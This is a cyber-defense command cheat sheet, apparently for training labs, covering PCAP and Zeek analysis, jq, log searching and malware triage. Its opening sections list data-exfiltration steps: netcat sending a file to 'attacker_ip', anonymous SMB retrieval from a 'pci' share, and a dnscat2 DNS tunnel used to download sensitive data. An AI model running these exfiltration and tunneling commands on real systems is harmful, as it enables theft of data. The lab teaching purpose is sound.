# Cyber Defense Command Reference

A searchable command reference for cybersecurity operations, threat hunting, incident response, and detection engineering.

---

# Command Index

## Data Exfiltration

netcat listener (receive file) | nc -lvnp 10000 > sensitive_data.csv  
netcat send file to remote host | nc attacker_ip 10000 -n -q1 < sensitive_data.csv  
list open ports (check unusual outbound) | netstat -tulnp  
list listening sockets (modern alternative) | ss -tuln  
show active connections with process info | ss -tp   
test outbound port connectivity | `nc -zvn 5.30.5.1 10000 -w1` 

## Internal Pivot (SMB Exfil Path)  

download file from SMB share | `smbclient //172.17.0.2/pci -c "get sensitive_data.csv" -N`  

### DNS Exfiltration (C2 / Tunneling)  

start dnscat server | `ruby /home/exfil/dnscat2/server/dnscat2.rb`  
start dnscat client | `/labs/egress/dnscat2/dnscat --dns=server=5.30.5.1,port=53`  
interact with dnscat session | `window -i 1`  
download file via dns tunnel | `download sensitive_data.csv`  
exit dnscat session | `exit`

## Encoding / Decoding

base64 decode | echo <base64> | base64 -d  
base64 decode + detect file type | echo <base64> | base64 -d | file -  
base64 encode | echo "text" | base64  
decode url encoding | python3 -c "import urllib.parse; print(urllib.parse.unquote('STRING'))"  
decode hex | echo <hex> | xxd -r -p  
convert binary to hex | xxd file  

---

## PCAP Analysis

extract readable strings from pcap | strings -n 10 capture.pcap  
save strings from pcap | strings -n 10 capture.pcap > capture-strings.txt  
analyze pcap with zeek | zeek -r capture.pcap  
read packets in pcap | tcpdump -r capture.pcap  
list conversations in pcap | tcpdump -r capture.pcap -nn  
extract http objects | tshark -r capture.pcap --export-objects http,files/  
show packet summary | tshark -r capture.pcap  
filter packets by IP | tshark -r capture.pcap -Y "ip.addr==192.168.1.1"  
filter http traffic | tshark -r capture.pcap -Y http  

---

## Zeek Analysis

generate zeek logs from pcap | zeek -r capture.pcap  
extract_files | zeek -r capture.pcap /usr/local/zeek/share/zeek/policy/frameworks/files/extract-all-files.zeek
view zeek connection logs | cat conn.log  
view ssl logs | cat ssl.log  
search ja3 fingerprint | grep "ja3" ssl.log  
search domain requests | grep "server_name" ssl.log  
search ip in logs | grep "192.168" conn.log  
search zeek files.log for OCSP response with zeek-cut | cat /labs/bc/hancitor/files.log | zeek-cut tx_hosts rx_hosts mime_type analyzers extracted | grep ocsp-response | wc -l
extract PE32 executable and run SHA256 checksum | file /labs/bc/hancitor/extract_files/* | grep PE32 | sha256sum /labs/bc/hancitor/extract_files/extract-1712416202.373352-HTTP-FEJYPN3cj0jY5qVBP6  
Zeek's http.log, what domain name received the most connections? | cat /labs/bc/hancitor/http.log | zeek-cut host | sort | uniq -c | sort -n

---

## JSON / jq Analysis

pretty print json | jq .  
extract json field | jq '.field'  
extract nested field | jq '.id.orig_h'  
filter json value | jq 'select(.field=="value")'  
count json objects | jq '. | length'  
show specific fields | jq '{id.orig_h,id.resp_h}'  

---

## Log Searching

search keyword | grep "text" file  
recursive search | grep -r "text" .  
case insensitive search | grep -i "text" file  
count matches | grep -c "text" file  
show line numbers | grep -n "text" file  
exclude matches | grep -v "text" file  
search multiple files | grep "text" *.log  
search for carved file names contain the string 'HTTP'? | ls -la /labs/bc/hancitor/extract_files/ | grep HTTP | wc -l

---

## File Analysis

detect file type | file filename  
detect piped data | file -  
view printable strings | strings file  
extract long strings | strings -n 10 file  
hex view file | xxd file  
view hex + ascii | hexdump -C file  
calculate file hash | sha256sum file 
calculate md5 hash | md5sum file  

---

## Malware Analysis Basics

find suspicious strings | strings malware.bin | grep http  
search command execution | strings file | grep "/bin"  
check for base64 blobs | strings file | grep -E "[A-Za-z0-9+/]{20,}={0,2}"  
check file entropy | ent file  
Scan the EXE with clamscan | clamscan file

---

## Network Utilities

show open ports | netstat -tulnp  
show listening ports | ss -tuln  
ping host | ping host  
trace network route | traceroute host  
dns lookup | dig domain.com  
reverse dns lookup | dig -x IP  

---

## File Extraction

extract tar | tar -xvf file.tar  
extract tar.gz | tar -xvzf file.tar.gz  
extract gzip | gunzip file.gz  
extract zip | unzip file.zip  

---

## System Investigation

list running processes | ps aux  
search running process | ps aux | grep process  
show disk usage | df -h  
show directory size | du -sh *  

---

## Lab Utilities

record terminal session | script lab_record.txt  
show command history | history  
save command history | history > commands.txt  
search history | history | grep command  

## Tricks

grep to print the two lines immediately after any matches | -A 2  

